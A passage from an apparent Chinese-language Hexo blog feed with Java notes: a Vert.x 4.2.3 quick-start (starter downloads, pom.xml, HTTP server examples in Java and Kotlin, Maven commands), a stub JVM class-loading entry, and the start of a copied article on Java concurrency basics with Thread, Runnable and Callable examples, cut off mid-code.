<h2 id="快速创建项目"><a href="#快速创建项目" class="headerlink" title="快速创建项目"></a>快速创建项目</h2><p><a href="https://start.vertx.io" target="_blank" rel="noopener">【start.vertx.io】</a> 这个网站可以快速创建项目，但是部分网页加载不出来(可能需科学上网)</p>
<p>但是，可以这个链接可以通过下面链接下载Demo：</p>
<ul>
<li><a href="https://start.vertx.io/starter.zip?vertxDependencies=vertx-web&amp;vertxVersion=4.2.3&amp;jdkVersion=11" target="_blank" rel="noopener">【defalut maven starter.zip】</a></li>
<li><a href="https://start.vertx.io/starter.zip?vertxDependencies=vertx-web&amp;buildTool=gradle&amp;vertxVersion=4.2.3&amp;jdkVersion=11" target="_blank" rel="noopener">【gradle starter.zip】</a></li>
</ul>
<p>文件列表如下<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tree starter-maven</span></span><br><span class="line">.</span><br><span class="line">├── mvnw</span><br><span class="line">├── mvnw.cmd</span><br><span class="line">├── pom.xml</span><br><span class="line">├── README.adoc</span><br><span class="line">└── src</span><br><span class="line">    ├── main</span><br><span class="line">    │   └── java</span><br><span class="line">    │       └── com</span><br><span class="line">    │           └── example</span><br><span class="line">    │               └── starter</span><br><span class="line">    │                   └── MainVerticle.java</span><br><span class="line">    └── test</span><br><span class="line">        └── java</span><br><span class="line">            └── com</span><br><span class="line">                └── example</span><br><span class="line">                    └── starter</span><br><span class="line">                        └── TestMainVerticle.java</span><br><span class="line"></span><br><span class="line">11 directories, 6 files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> tree starter-gradle</span></span><br><span class="line">starter-gradle</span><br><span class="line">├── build.gradle.kts</span><br><span class="line">├── gradle</span><br><span class="line">│   └── wrapper</span><br><span class="line">│       ├── gradle-wrapper.jar</span><br><span class="line">│       └── gradle-wrapper.properties</span><br><span class="line">├── gradlew</span><br><span class="line">├── gradlew.bat</span><br><span class="line">├── README.adoc</span><br><span class="line">├── settings.gradle.kts</span><br><span class="line">└── src</span><br><span class="line">    ├── main</span><br><span class="line">    │   └── java</span><br><span class="line">    │       └── com</span><br><span class="line">    │           └── example</span><br><span class="line">    │               └── starter</span><br><span class="line">    │                   └── MainVerticle.java</span><br><span class="line">    └── test</span><br><span class="line">        └── java</span><br><span class="line">            └── com</span><br><span class="line">                └── example</span><br><span class="line">                    └── starter</span><br><span class="line">                        └── TestMainVerticle.java</span><br><span class="line"></span><br><span class="line">13 directories, 9 files</span><br></pre></td></tr></table></figure></p>
<p>pom.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven-compiler-plugin.version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">maven-compiler-plugin.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven-shade-plugin.version</span>&gt;</span>3.2.4<span class="tag">&lt;/<span class="name">maven-shade-plugin.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven-surefire-plugin.version</span>&gt;</span>2.22.2<span class="tag">&lt;/<span class="name">maven-surefire-plugin.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exec-maven-plugin.version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">exec-maven-plugin.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">vertx.version</span>&gt;</span>4.2.3<span class="tag">&lt;/<span class="name">vertx.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">junit-jupiter.version</span>&gt;</span>5.7.0<span class="tag">&lt;/<span class="name">junit-jupiter.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">main.verticle</span>&gt;</span>com.example.starter.MainVerticle<span class="tag">&lt;/<span class="name">main.verticle</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">launcher.class</span>&gt;</span>io.vertx.core.Launcher<span class="tag">&lt;/<span class="name">launcher.class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.vertx<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>vertx-stack-depchain<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;vertx.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.vertx<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>vertx-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.vertx<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>vertx-junit5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;junit-jupiter.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;junit-jupiter.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;maven-compiler-plugin.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">release</span>&gt;</span>11<span class="tag">&lt;/<span class="name">release</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;maven-shade-plugin.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">transformers</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Main-Class</span>&gt;</span>$&#123;launcher.class&#125;<span class="tag">&lt;/<span class="name">Main-Class</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Main-Verticle</span>&gt;</span>$&#123;main.verticle&#125;<span class="tag">&lt;/<span class="name">Main-Verticle</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">transformer</span> <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.ServicesResourceTransformer"</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">outputFile</span>&gt;</span>$&#123;project.build.directory&#125;/$&#123;project.artifactId&#125;-$&#123;project.version&#125;-fat.jar</span><br><span class="line">              <span class="tag">&lt;/<span class="name">outputFile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;maven-surefire-plugin.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.mojo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>exec-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;exec-maven-plugin.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>io.vertx.core.Launcher<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">arguments</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">argument</span>&gt;</span>run<span class="tag">&lt;/<span class="name">argument</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">argument</span>&gt;</span>$&#123;main.verticle&#125;<span class="tag">&lt;/<span class="name">argument</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">arguments</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>MainVerticle.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.vertx.core.AbstractVerticle;</span><br><span class="line"><span class="keyword">import</span> io.vertx.core.Promise;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainVerticle</span> <span class="keyword">extends</span> <span class="title">AbstractVerticle</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(Promise&lt;Void&gt; startPromise)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    vertx.createHttpServer().requestHandler(req -&gt; &#123;</span><br><span class="line">      req.response()</span><br><span class="line">        .putHeader(<span class="string">"content-type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">        .end(<span class="string">"Hello from Vert.x!"</span>);</span><br><span class="line">    &#125;).listen(<span class="number">8888</span>, http -&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (http.succeeded()) &#123;</span><br><span class="line">        startPromise.complete();</span><br><span class="line">        System.out.println(<span class="string">"HTTP server started on port 8888"</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        startPromise.fail(http.cause());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>启动 tests:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./mvnw clean test</span><br></pre></td></tr></table></figure></p>
<p>打包应用:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./mvnw clean package</span><br></pre></td></tr></table></figure></p>
<p>启动应用服务:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./mvnw clean compile exec:java</span><br></pre></td></tr></table></figure></p>
<h2 id="构建HTTPServer"><a href="#构建HTTPServer" class="headerlink" title="构建HTTPServer"></a>构建HTTPServer</h2><p>摘自：<a href="https://vertx.io/get-started/" target="_blank" rel="noopener">【vertx.io/get-started】</a></p>
<p>Java代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainVerticle</span> <span class="keyword">extends</span> <span class="title">AbstractVerticle</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// Create a Router</span></span><br><span class="line">    Router router = Router.router(vertx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Mount the handler for all incoming requests at every path and HTTP method</span></span><br><span class="line">    router.route().handler(context -&gt; &#123;</span><br><span class="line">      <span class="comment">// Get the address of the request</span></span><br><span class="line">      String address = context.request().connection().remoteAddress().toString();</span><br><span class="line">      <span class="comment">// Get the query parameter "name"</span></span><br><span class="line">      MultiMap queryParams = context.queryParams();</span><br><span class="line">      String name = queryParams.contains(<span class="string">"name"</span>) ? queryParams.get(<span class="string">"name"</span>) : <span class="string">"unknown"</span>;</span><br><span class="line">      <span class="comment">// Write a json response</span></span><br><span class="line">      context.json(</span><br><span class="line">        <span class="keyword">new</span> JsonObject()</span><br><span class="line">          .put(<span class="string">"name"</span>, name)</span><br><span class="line">          .put(<span class="string">"address"</span>, address)</span><br><span class="line">          .put(<span class="string">"message"</span>, <span class="string">"Hello "</span> + name + <span class="string">" connected from "</span> + address)</span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the HTTP server</span></span><br><span class="line">    vertx.createHttpServer()</span><br><span class="line">      <span class="comment">// Handle every request using the router</span></span><br><span class="line">      .requestHandler(router)</span><br><span class="line">      <span class="comment">// Start listening</span></span><br><span class="line">      .listen(<span class="number">8888</span>)</span><br><span class="line">      <span class="comment">// Print the port</span></span><br><span class="line">      .onSuccess(server -&gt;</span><br><span class="line">        System.out.println(</span><br><span class="line">          <span class="string">"HTTP server started on port "</span> + server.actualPort()</span><br><span class="line">        )</span><br><span class="line">      );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>kotlin代码<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainVerticle</span> : <span class="type">AbstractVerticle</span></span>() &#123;</span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">start</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Create a Router</span></span><br><span class="line">    <span class="keyword">val</span> router = Router.router(vertx)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Mount the handler for all incoming requests at every path and HTTP method</span></span><br><span class="line">    router.route().handler &#123; context -&gt;</span><br><span class="line">      <span class="comment">// Get the address of the request</span></span><br><span class="line">      <span class="keyword">val</span> address = context.request().connection().remoteAddress().toString()</span><br><span class="line">      <span class="comment">// Get the query parameter "name"</span></span><br><span class="line">      <span class="keyword">val</span> queryParams = context.queryParams()</span><br><span class="line">      <span class="keyword">val</span> name = queryParams.<span class="keyword">get</span>(<span class="string">"name"</span>) ?: <span class="string">"unknown"</span></span><br><span class="line">      <span class="comment">// Write a json response</span></span><br><span class="line">      context.json(</span><br><span class="line">          json &#123;</span><br><span class="line">            obj(</span><br><span class="line">              <span class="string">"name"</span> to name,</span><br><span class="line">              <span class="string">"address"</span> to address,</span><br><span class="line">              <span class="string">"message"</span> to <span class="string">"Hello <span class="variable">$name</span> connected from <span class="variable">$address</span>"</span></span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the HTTP server</span></span><br><span class="line">    vertx.createHttpServer()</span><br><span class="line">        <span class="comment">// Handle every request using the router</span></span><br><span class="line">        .requestHandler(router)</span><br><span class="line">        <span class="comment">// Start listening</span></span><br><span class="line">        .listen(<span class="number">8888</span>)</span><br><span class="line">        <span class="comment">// Print the port</span></span><br><span class="line">        .onSuccess &#123; server -&gt;</span><br><span class="line">          println(<span class="string">"HTTP server started on port "</span> + server.actualPort())</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>参考：<br><a href="https://zhuanlan.zhihu.com/p/352401631" target="_blank" rel="noopener">【万字长文入门Vert.x】</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>黑马程序员JVM类加载与字节码笔记</title>
    <url>/Java/%E9%BB%91%E9%A9%AC%E7%A8%8B%E5%BA%8F%E5%91%98JVM%E7%B1%BB%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>本文是<a href="https://b23.tv/AYSxdj" target="_blank" rel="noopener"><strong>【黑马程序员JVM完整教程，全网超高评价，全程干货不拖沓-哔哩哔哩】</strong></a>教学视频学习所做的笔记</p>
<blockquote>
<p>部分笔记内容拷贝自<a href="https://nyimac.gitee.io/2020/07/03/JVM%E5%AD%A6%E4%B9%A0/#1%E3%80%81%E7%A8%8B%E5%BA%8F%E8%AE%A1%E6%95%B0%E5%99%A8" target="_blank" rel="noopener">【JVM学习】</a></p>
</blockquote>
<h3 id="三、类加载与字节码笔"><a href="#三、类加载与字节码笔" class="headerlink" title="三、类加载与字节码笔"></a>三、类加载与字节码笔</h3>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>思维导图整理Java并发基础</title>
    <url>/Java/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%95%B4%E7%90%86Java%E5%B9%B6%E5%8F%91%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>看到这篇文章<a href="https://www.cnblogs.com/three-fighter/p/14367721.html" target="_blank" rel="noopener">《思维导图整理 Java 并发基础》</a>写的很好，拷贝过来备忘。</p>
<p>这个文章作者的其他好文：</p>
<ul>
<li><a href="https://www.cnblogs.com/three-fighter/p/14491256.html" target="_blank" rel="noopener">面试官问：“在项目中用过多线程吗？”你就把这个案例讲给他听！</a></li>
</ul>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/%E5%B9%B6%E5%8F%91%E5%9F%BA%E7%A1%80.png" alt></p>
<h1 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h1><p>欲说线程，必先说进程。</p>
<ul>
<li><strong>进程</strong>：进程是代码在数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位。</li>
<li><strong>线程</strong>：线程是进程的一个执行路径，一个进程中至少有一个线程，进程中的多个线程共享进程的资源。</li>
</ul>
<p>操作系统在分配资源时是把资源分配给进程的， 但是 CPU 资源比较特殊，它是被分配到线程的，因为真正要占用CPU运行的是线程，所以也说线程是 <strong>CPU分配的基本单位</strong>。</p>
<p>在Java中，当我们启动 main 函数其实就启动了一个JVM进程，而 main 函数在的线程就是这个进程中的一个线程，也称主线程。</p>
<p>示意图如下：</p>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/%E7%A8%8B%E5%BA%8F%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B%E5%85%B3%E7%B3%BB.png" alt="程序进程线程关系"></p>
<p>一个进程中有多个线程，多个线程共用进程的堆和方法区资源，但是每个线程有自己的程序计数器和栈。</p>
<h1 id="2、线程创建和运行"><a href="#2、线程创建和运行" class="headerlink" title="2、线程创建和运行"></a>2、线程创建和运行</h1><p>Java中创建线程有三种方式，分别为继承Thread类、实现Runnable接口、实现Callable接口。</p>
<ul>
<li>继承Thread类，重写run()方法，调用start()方法启动线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 继承Thread类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"This is child thread"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyThread thread = <span class="keyword">new</span> MyThread();</span><br><span class="line">        thread.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>实现 Runnable 接口run()方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunnableTask</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Runnable!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RunnableTask task = <span class="keyword">new</span> RunnableTask();</span><br><span class="line">        <span class="keyword">new</span> Thread(task).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面两种都没有返回值。</p>
<ul>
<li>实现Callable接口call()方法，这种方式可以通过FutureTask获取任务执行的返回值</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallerTask</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello,i am running!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建异步任务</span></span><br><span class="line">        FutureTask&lt;String&gt; task=<span class="keyword">new</span> FutureTask&lt;String&gt;(<span class="keyword">new</span> CallerTask());</span><br><span class="line">        <span class="comment">//启动线程</span></span><br><span class="line">        <span class="keyword">new</span> Thread(task).start();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//等待执行完成，并获取返回结果</span></span><br><span class="line">            String result=task.get();</span><br><span class="line">            System.out.println(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    